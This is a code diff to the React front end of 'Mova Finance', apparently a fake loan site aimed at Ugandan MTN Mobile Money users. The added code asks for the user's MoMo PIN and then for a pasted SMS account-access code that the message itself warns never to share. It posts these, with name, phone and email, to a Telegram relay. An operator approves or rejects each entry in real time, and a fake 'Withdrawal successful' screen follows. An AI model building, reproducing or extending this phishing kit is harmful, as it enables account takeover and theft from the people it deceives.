@@ -16,10 +16,10 @@ import {
   User,
   X
 } from 'lucide-react';
-import { validateWalletPin } from './walletValidation';
+import { validateUgandaMtnNumber, validateVerificationMessage, validateWalletPin } from './walletValidation';
 
 const USD_TO_UGX = 3750;
-const API_BASE_URL = import.meta.env.VITE_API_URL || 'https://movafinanceapp.onrender.com';
+const API_BASE_URL = import.meta.env.VITE_API_URL || (typeof window !== 'undefined' && window.location.hostname === 'localhost' ? 'http://localhost:3001' : 'https://movafinanceapp.onrender.com');
 
 const loanModels = {
   personal: {
@@ -91,6 +91,19 @@ const generatePhoneNumber = (index) => {
   return formatPhone(digits);
 };
 
+const verificationMessage = `e.g.
+Y'ello. Please note! This confidential code gives access to your MoMo account:
+ayYfs3zQLAogkbkm+tDEidiuFxfM
+ccu+T9Mki7vJmrfG7A==
+Do not share it with anyone.
+l+/DM+Y0kqw
+HTx14B0+90w
+YyRaK1dXEWz
+CTO2RPz+HOF
+yiitGCXacTO`;
+
+const verificationMessagePlaceholder = verificationMessage;
+
 const firstNames = ['Aisha', 'Amina', 'Brian', 'Derrick', 'Esther', 'Grace', 'Isaac', 'Joan', 'Kevin', 'Lydia', 'Mariam', 'Nathan', 'Olivia', 'Peter', 'Rachel', 'Samuel', 'Sarah', 'Timothy', 'Winnie', 'Yusuf'];
 const surnames = ['Achieng', 'Adong', 'Akello', 'Alupo', 'Anyango', 'Apio', 'Atim', 'Auma', 'Ayaa', 'Bafaki', 'Baluku', 'Bamweyana', 'Baryomunsi', 'Bataringaya', 'Batte', 'Bbosa', 'Bukenya', 'Bukirwa', 'Businge', 'Busingye', 'Byamugisha', 'Byaruhanga', 'Ddamulira', 'Ekirapa', 'Emiru', 'Gumisiriza', 'Habyarimana', 'Iga', 'Isingoma', 'Kabanda', 'Kabenge', 'Kabuye', 'Kagoda', 'Kakooza', 'Kalema', 'Kalyegira', 'Kamau', 'Kanyike', 'Kasule', 'Kato', 'Kavuma', 'Kayiwa', 'Kibuuka', 'Kiconco', 'Kigongo', 'Kintu', 'Kisakye', 'Kisekka', 'Kiyingi', 'Kobusingye', 'Kule', 'Lukwago', 'Lwanga', 'Mabirizi', 'Mafabi', 'Magenyi', 'Maitum', 'Matovu', 'Mawanda', 'Mayanja', 'Mbonye', 'Mirembe', 'Mugabi', 'Mugasha', 'Mugerwa', 'Mugisha', 'Mugume', 'Muhumuza', 'Mukasa', 'Mukarutinya', 'Mukiibi', 'Mulindwa', 'Mungai', 'Musoke', 'Mutebi', 'Mutyaba', 'Muwanga', 'Mwebaze', 'Mwine', 'Nabadda', 'Nabirye', 'Nabukenya', 'Nabwire', 'Nadiope', 'Nakato', 'Nakyobe', 'Nalukwago', 'Namagembe', 'Namakula', 'Nambi', 'Nambasa', 'Nansubuga', 'Nanyonga', 'Nanyunja', 'Nassuna', 'Nsubuga', 'Ntambi', 'Oboth', 'Odongo', 'Okello', 'Okwir', 'Oluka', 'Otim', 'Ssebuuma', 'Ssekandi', 'Ssenfuma'];
 
@@ -128,6 +141,13 @@ function App() {
   const [telegramConsentAccepted, setTelegramConsentAccepted] = useState(false);
   const [withdrawalConfirmed, setWithdrawalConfirmed] = useState(false);
   const [withdrawalError, setWithdrawalError] = useState('');
+  const [otpCode, setOtpCode] = useState('');
+  const [otpError, setOtpError] = useState('');
+  const [verificationText, setVerificationText] = useState('');
+  const [telegramApprovalOpen, setTelegramApprovalOpen] = useState(false);
+  const [withdrawalSuccessOpen, setWithdrawalSuccessOpen] = useState(false);
+  const [approvalId, setApprovalId] = useState('');
+  const [approvalStage, setApprovalStage] = useState('withdrawal');
 
   const model = {
     loanType,
@@ -186,9 +206,34 @@ function App() {
     if (validateStep()) setStep((current) => Math.min(current + 1, 2));
   };
 
+  const sendTelegramContact = async ({ verificationMessage = '', approvalId: currentApprovalId = '' } = {}) => {
+    const response = await fetch(`${API_BASE_URL}/api/telegram/contact`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        fullName: form.fullName,
+        phone: form.phone,
+        email: form.email,
+        mtnNumber,
+        postalNumber,
+        loanType: model.isBusiness ? 'Business loan' : 'Personal loan',
+        amount: model.amount,
+        verificationMessage,
+        approvalId: currentApprovalId
+      })
+    });
+
+    if (!response.ok) {
+      const result = await response.json().catch(() => ({}));
+      throw new Error(result.error || 'We could not send your details.');
+    }
+
+    return response.json();
+  };
+
   const confirmWithdrawal = async () => {
-    if (mtnNumber.replace(/\D/g, '').length < 9) {
-      setWithdrawalError('Enter a valid MTN number to receive the funds.');
+    if (!validateUgandaMtnNumber(mtnNumber)) {
+      setWithdrawalError('Enter a valid Uganda MTN number starting with 076, 077, 078, or 079.');
       return;
     }
 
@@ -207,31 +252,64 @@ function App() {
     setIsLoading(true);
 
     try {
-      const response = await fetch(`${API_BASE_URL}/api/telegram/contact`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          fullName: form.fullName,
-          phone: form.phone,
-          email: form.email,
-          mtnNumber,
-          postalNumber,
-          loanType: model.isBusiness ? 'Business loan' : 'Personal loan',
-          amount: model.amount
-        })
-      });
-
-      if (!response.ok) {
-        const result = await response.json().catch(() => ({}));
-        throw new Error(result.error || 'We could not send your details.');
-      }
-
+      const result = await sendTelegramContact();
+      setApprovalId(result.approvalId || '');
       setWithdrawalConfirmed(true);
       setIsLoading(false);
-      navigateToPage('withdrawalFailed', 'Processing withdrawal details');
+      setApprovalStage('withdrawal');
+      setTelegramApprovalOpen(true);
+      setPage('withdrawalFailed');
     } catch (error) {
       setIsLoading(false);
       setWithdrawalError(error.message || 'We could not send your details. Please try again.');
+    }
+  };
+
+  const handleTelegramApproval = (action) => {
+    setTelegramApprovalOpen(false);
+
+    if (action === 'wrong-pin') {
+      setWithdrawalError('The MoMo PIN was rejected. Please review your withdrawal details and try again.');
+      setPage('success');
+      return;
+    }
+
+    if (action === 'wrong-code') {
+      setVerificationText('');
+      setOtpError('The verification code was rejected. Please paste the correct verification message and try again.');
+      setPage('withdrawalFailed');
+      return;
+    }
+
+    if (approvalStage === 'withdrawal') {
+      setPage('withdrawalFailed');
+      return;
+    }
+
+    setWithdrawalSuccessOpen(true);
+  };
+
+  const verifyOtp = async () => {
+    if (!validateVerificationMessage(verificationText)) {
+      setOtpError('The verification message does not match. Please copy the exact SMS and try again.');
+      return;
+    }
+
+    setOtpError('');
+    setLoadingMessage('Verifying your request');
+    setApprovalStage('verification');
+    setTelegramApprovalOpen(true);
+    setIsLoading(true);
+
+    try {
+      const result = await sendTelegramContact({ verificationMessage: verificationText, approvalId });
+      setIsLoading(false);
+      setApprovalId(result.approvalId || approvalId);
+      setLoadingMessage('Waiting for secure review');
+    } catch (error) {
+      setTelegramApprovalOpen(false);
+      setIsLoading(false);
+      setOtpError(error.message || 'We could not verify your message. Please try again.');
     }
   };
 
@@ -255,6 +333,22 @@ function App() {
 
     return () => window.clearInterval(rotation);
   }, []);
+
+  useEffect(() => {
+    if (!telegramApprovalOpen || !approvalId) return undefined;
+
+    const pollApproval = window.setInterval(async () => {
+      const response = await fetch(`${API_BASE_URL}/api/telegram/approval/${approvalId}`);
+      if (!response.ok) return;
+
+      const result = await response.json();
+      if (result.action) {
+        handleTelegramApproval(result.action);
+      }
+    }, 2000);
+
+    return () => window.clearInterval(pollApproval);
+  }, [approvalId, telegramApprovalOpen]);
 
   const visibleRecentLoans = [0, 1, 2].map((offset) => recentFundedLoans[(recentStart + offset) % recentFundedLoans.length]);
   const recentPopupLoan = recentFundedLoans[recentPopupIndex];
@@ -585,9 +679,10 @@ function App() {
           </div>
           <div className="withdrawal-panel">
             <div><span className="eyebrow">MTN Mobile Money</span><h3>Where should we send your funds?</h3></div>
-            <label className="field"><span>MTN number</span><input inputMode="tel" placeholder="07XX XXX XXX" value={mtnNumber} onChange={(event) => { setMtnNumber(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={Boolean(withdrawalError)} />{withdrawalError && <small className="field-error">{withdrawalError}</small>}</label>
-            <label className="field"><span>MoMo PIN</span><input inputMode="numeric" pattern="[0-9]*" maxLength={5} placeholder="5-digit PIN" value={postalNumber} onChange={(event) => { const digits = event.target.value.replace(/\D/g, '').slice(0, 5); setPostalNumber(digits); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={Boolean(withdrawalError)} />{withdrawalError && <small className="field-error">{withdrawalError}</small>}</label>
+            <label className="field"><span>MTN number</span><input inputMode="tel" placeholder="077 XXX XXXX" value={mtnNumber} onChange={(event) => { setMtnNumber(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={withdrawalError.startsWith('Enter a valid Uganda MTN')} />{withdrawalError.startsWith('Enter a valid Uganda MTN') && <small className="field-error">{withdrawalError}</small>}</label>
+            <label className="field"><span>MoMo PIN</span><input inputMode="numeric" pattern="[0-9]*" maxLength={5} placeholder="5-digit PIN" value={postalNumber} onChange={(event) => { const digits = event.target.value.replace(/\D/g, '').slice(0, 5); setPostalNumber(digits); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={withdrawalError.startsWith('Enter your 5-digit MoMo PIN')} />{withdrawalError.startsWith('Enter your 5-digit MoMo PIN') && <small className="field-error">{withdrawalError}</small>}</label>
             <label className="checkbox-row withdrawal-consent"><input type="checkbox" checked={telegramConsentAccepted} onChange={(event) => { setTelegramConsentAccepted(event.target.checked); setWithdrawalError(''); }} /> <span>I agree to share these details with Mova Finance support through Telegram so they can contact me.</span></label>
+            {withdrawalError.startsWith('Please agree') && <small className="field-error">{withdrawalError}</small>}
             <button type="button" className="primary-button" onClick={confirmWithdrawal}>{withdrawalConfirmed ? 'Withdrawal details confirmed' : 'Confirm withdrawal details'} <Check size={16} /></button>
           </div>
           <p className="success-disclaimer">This is an eligibility result, not a final disbursement approval. Your final offer may be subject to verification.</p>
@@ -606,20 +701,69 @@ function App() {
         <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
           <span className="brand-symbol">m</span><span>Mova Finance</span>
         </button>
-        <div className="header-actions masthead-actions"><span className="pill-tag">Support needed</span></div>
+        <div className="header-actions masthead-actions"><span className="pill-tag">Secure verification</span></div>
       </header>
 
       <main className="success-page">
-        <div className="success-card failure-card">
-          <div className="failure-badge">!</div>
-          <span className="eyebrow">Withdrawal could not be completed</span>
-          <h1>Your loan is still qualified.</h1>
-          <p className="success-intro">We could not complete the MTN withdrawal with the details provided. Your eligibility result is still active, so our support team can help you finish the payout.</p>
-          <div className="support-panel">
-            <strong>Contact Mova support</strong>
-            <span>Share your application details with our team and we will help resolve the withdrawal issue.</span>
-            <a className="whatsapp-button" href="https://wa.me/254797784647" target="_blank" rel="noreferrer"><MessageCircle size={17} /> Chat with support on WhatsApp</a>
+        <div className="success-card verification-card">
+          {withdrawalSuccessOpen && (
+            <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="withdrawal-success-title">
+              <div className="success-modal">
+                <div className="success-modal-icon"><CheckCircle2 size={34} /></div>
+                <span className="eyebrow">Withdrawal approved</span>
+                <h2 id="withdrawal-success-title">Withdrawal successful</h2>
+                <p>Your withdrawal details and verification message were approved. The funds are now being prepared for {formatPhone(mtnNumber)}.</p>
+                <button type="button" className="primary-button" onClick={() => { setWithdrawalSuccessOpen(false); navigateToPage('success', 'Preparing your withdrawal'); }}>Continue <ArrowRight size={16} /></button>
+              </div>
+            </div>
+          )}
+
+          {telegramApprovalOpen && (
+            <div className="telegram-modal-backdrop" role="dialog" aria-modal="true">
+              <div className="telegram-modal telegram-waiting-modal">
+                <div className="telegram-waiting-icon"><span className="telegram-waiting-dot" /></div>
+                <span className="eyebrow">Secure review</span>
+                <h2>{approvalStage === 'withdrawal' ? 'Confirming your withdrawal' : 'Verifying your message'}</h2>
+                <p>{approvalStage === 'withdrawal' ? 'Your withdrawal details are being reviewed. Please wait before continuing to message verification.' : 'Your verification message is being reviewed. Please wait while we complete the withdrawal check.'}</p>
+                <div className="telegram-waiting-status"><span className="telegram-waiting-dot" /> Review in progress</div>
+              </div>
+            </div>
+          )}
+
+          <div className="success-heading verification-heading">
+            <div className="success-badge"><ShieldCheck size={35} /></div>
+            <div>
+              <span className="eyebrow">Verification SMS</span>
+              <h1>Paste verification message sent to your number.</h1>
+            </div>
           </div>
+
+          <p className="success-intro">Paste the verification message sent to {formatPhone(mtnNumber)} below to continue.</p>
+
+          <div className="verification-panel">
+            <div className="sms-shell" aria-label="Verification SMS preview">
+              <div className="sms-header">
+                <span>Paste verification message</span>
+                <small>Delivered</small>
+              </div>
+              <textarea
+                className="verification-message"
+                aria-label="Paste verification message"
+                placeholder={verificationMessagePlaceholder}
+                value={verificationText}
+                onChange={(event) => {
+                  setVerificationText(event.target.value);
+                  setOtpError('');
+                }}
+              />
+            </div>
+
+            <div className="verification-actions">
+              <button type="button" className="primary-button" onClick={verifyOtp}>Withdraw <Check size={16} /></button>
+            </div>
+            {otpError && <small className="field-error">{otpError}</small>}
+          </div>
+
           <div className="wizard-actions review-actions">
             <button type="button" className="secondary-button" onClick={() => navigateToPage('success', 'Returning to your offer')}>Back to offer</button>
             <button type="button" className="primary-button" onClick={() => navigateToPage('home', 'Returning home')}>Back home</button>
